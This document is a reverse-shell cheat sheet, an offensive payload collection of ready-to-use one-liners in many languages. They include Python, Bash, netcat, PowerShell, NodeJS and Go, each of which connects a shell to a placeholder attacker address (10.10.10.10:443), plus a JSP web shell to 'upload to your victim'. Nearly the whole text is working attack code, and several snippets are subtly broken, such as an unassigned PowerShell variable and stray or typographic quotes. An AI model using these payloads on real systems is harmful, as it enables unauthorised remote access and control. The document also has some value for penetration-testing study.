# Reverse-Shell-Cheat-Sheet
Basic reverse shells for any scenario

# Reverse Shell Types

- Python
- Perl
- Bash TCP
- Bash UDP
- PHP
- Netcat
- Java
- Pure Groovy (Jenkins)
- Gawk 
- Telnet
- awk
- Socat
- xterm
- Powershell
- NodeJS
- TCLsh
- Golang
- JSP
- Web.config

# Python

```
One-Liner 
-----------------------------------------------------------

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

// Replace the IP & Port

Python Script

-----------------------------------------------------------

import socket
import subprocess
import os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.10.10",443)); 
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/bash","-i"]);'

// Replace the IP & Port

```


# Perl

```
One-Liner 
-----------------------------------------------------------

perl -e 'use Socket;$i="10.10.10.10";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'

// Replace IP & Port

```

# Bash TCP

```
One-Liner 
-----------------------------------------------------------

bash -i >& /dev/tcp/10.10.10.10/443 0>&1

// Replace IP & Port

```

# Bash UDP

```
One-Liner 
-----------------------------------------------------------
Victim
sh -i >& /dev/udp/10.10.10.10/443 0>&1

Attacker
nc -u -lvp 443

// Replace IP & Port

```

# PHP

```
One-Liner 
-----------------------------------------------------------

php -r '$sock=fsockopen("10.10.10.10",443);exec("/bin/sh -i <&3 >&3 2>&3");'

// Replace IP & Port

```

# NetCat

```
One-Liner 
-----------------------------------------------------------

nc -e /bin/sh 10.10.10.10 443
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 443 >/tmp/f 
find /home -exec nc -lvp 4444 -e /bin/bash \;

// Replace IP & Port

```

# Java

```
One-Liner 
-----------------------------------------------------------

r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.10.10/443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

// Replace IP & Port

```

# Pure Groovy (Jenkins)

```
One-Liner 
-----------------------------------------------------------

String host="localhost";
int port=443;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

// Replace Host & Port

```

# Gawk

```
One-Liner 
-----------------------------------------------------------

#!/usr/bin/gawk -f

BEGIN {
        Port    =       443
        Prompt  =       "bkd> "

        Service = "/inet/tcp/" Port "/0/0"
        while (1) {
                do {
                        printf Prompt |& Service
                        Service |& getline cmd
                        if (cmd) {
                                while ((cmd |& getline) > 0)
                                        print $0 |& Service
                                close(cmd)
                        }
                } while (cmd != "exit")
                close(Service)
        }
}

// Replace Port

```

# Telnet

```
One-Liner 
-----------------------------------------------------------

rm -f /tmp/p; mknod /tmp/p p && telnet 10.10.10.10 443 0/tmp/p 2>&1

// Replace IP & Port

```

# awk

```
One-Liner 
-----------------------------------------------------------

awk 'BEGIN {s = "/inet/tcp/0/10.10.10.10/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null

// Replace IP & Port

```


# Socat

```
One-Liner 
-----------------------------------------------------------
Victim

socat tcp-connect:10.10.10.10:443 exec:/bin/sh,pty,stderr,setsid,sigint,sane

Attacker 

socat file:`tty`,raw,echo=0 tcp-listen:443

// Replace IP & Port

```

# xterm

```
One-Liner 
-----------------------------------------------------------

xterm -display 10.10.10.10:1
Xnest :1
xhost +targetip

// Replace IP & Port

```

# Powershell

```
One-Liner's 
-----------------------------------------------------------

powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

// Replace IP & Port

```

# NodeJS

```
One-Liner's 
-----------------------------------------------------------

(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(443, "10.10.10.10", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; 
})();

// Replace IP & Port

```

# TCLsh

```
One-Liner's 
-----------------------------------------------------------

echo 'set s [socket 10.10.10.10 443];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh

// Replace IP & Port

```

# Golang

```
One-Liner's 
-----------------------------------------------------------

echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.10.10.10:443");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go

// Replace IP & Port

```

# JSP

```
// Paste below in .jsp file and uplaod to your victim

<%@ page
import=”java.util.*,java.io.*”%>
<%
%>
<HTML>
<BODY>
<H3>Basic JSP Shell</H3>
<FORM METHOD=”GET” NAME=”myform”
ACTION=”">
<INPUT TYPE=”text” NAME=”cmd”>
<INPUT TYPE=”submit” VALUE=”Execute”>
</FORM>
<PRE>
<%
if (request.getParameter(“cmd”) != null) {
out.println(“Command: ” +
request.getParameter(“cmd”) + “<BR>”);
Process p =
Runtime.getRuntime().exec(request.getParameter(“cmd”));
OutputStream os = p.getOutputStream();
InputStream in = p.getInputStream();
DataInputStream dis = new DataInputStream(in);
String disr = dis.readLine();
while ( disr != null ) {
out.println(disr);
disr = dis.readLine();
}
}
%>
</PRE>
</BODY>
</HTML>

```


